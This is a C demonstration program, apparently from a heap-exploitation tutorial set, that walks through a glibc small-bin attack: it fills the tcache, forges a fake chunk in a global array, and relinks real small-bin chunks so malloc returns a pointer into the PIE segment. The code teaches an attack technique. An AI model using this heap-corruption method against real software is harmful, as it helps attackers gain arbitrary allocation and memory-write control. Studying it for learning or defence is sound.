#include <stdio.h>
#include <stdlib.h>

#define CHUNK_SIZE0 0x300
#define CHUNK_SIZE1 0x080
#define CHUNK_SIZE2 0x500

long long_array[100];

void main() {
    int i;
    long *chunk0,
            *chunk1;

    char *tcache_chunks[7];

    // So the goal of this, is to get malloc to allocate a ptr to `long_array` (from the PIE segment)
    // We will leverage the small bin to do this, via making a fake chunk at where we want to allocate it
    // and insert it into the small bin

    // First, in order to insert chunks into the small bin
    // We will have to fill up the corresponding tcache bin
    // So we go ahead and allocate those chunks now

    for (i = 0; i < 7; i++) {
        tcache_chunks[i] = malloc(CHUNK_SIZE0);
    }

    // Allocate our two chunks which will be inserted into the small bin
    // along with chunks in between to prevent consolidation

    chunk0 = malloc(CHUNK_SIZE0);
    malloc(CHUNK_SIZE1);
    chunk1 = malloc(CHUNK_SIZE0);
    malloc(CHUNK_SIZE1);

    // Now we fill up the corresponding tcache

    for (i = 0; i < 7; i++) {
        free(tcache_chunks[i]);
    }

    // Insert our two (soon to be small bin) chunks into the unsorted bin

    free(chunk0);
    free(chunk1);

    // Move the two unsorted bin chunks over to the small bin

    malloc(CHUNK_SIZE2);

    // Then, in order to allocate a small bin chunk
    // we will have to empty the corresponding tcache bin

    for (i = 0; i < 7; i++) {
        tcache_chunks[i] = malloc(CHUNK_SIZE0);
    }

    // Now, let's go ahead, make our "fake" small bin chunk
    // For this, we only need to set the `prev_size` (setting it to `0x00`), and the chunk_size

    long_array[0] = 0x0000000000000000;
    long_array[1] = 0x0000000000000311;

    // Then we go ahead, and link this chunk against the two real small bin chunks

    long_array[2] = ((long)chunk0 - 0x10); // Fwd
    long_array[3] = ((long)chunk1 - 0x10); // Bk

    // Now in other writeups here where we do similar things with the unsorted bin / large bin
    // You will see us have to make a chunk header right after this chunk because of the 'unlink_chunk' function
    // We don't have to worry about that here

    // And we go ahead, and link the two real small bin chunks against our fake small bin chunk

    chunk0[1] = &long_array[0]; // Chunk0 bk
    chunk1[0] = &long_array[0]; // Chunk1 fwd

    // Now we are ready, all that is left to do is allocate the chunk.

    // Similar to the fastbin, since the tcache has bins for the same sizes the small bin does
    // When a small bin chunk is allocate, it will attempt to move as many chunks as it can
    // Over to the corresponding tcache bin. This doesn't really affect us too much here,
    // Just good to keep in mind. Although it does flip the order of chunks, so we will need an extra malloc

    // Reallocate chunk0 from small bin
    malloc(CHUNK_SIZE0);

    // Reallocate chunk1 from tcache
    malloc(CHUNK_SIZE0);

    // Allocate our PIE chunk (to long_array) from tcache
    malloc(CHUNK_SIZE0);
}
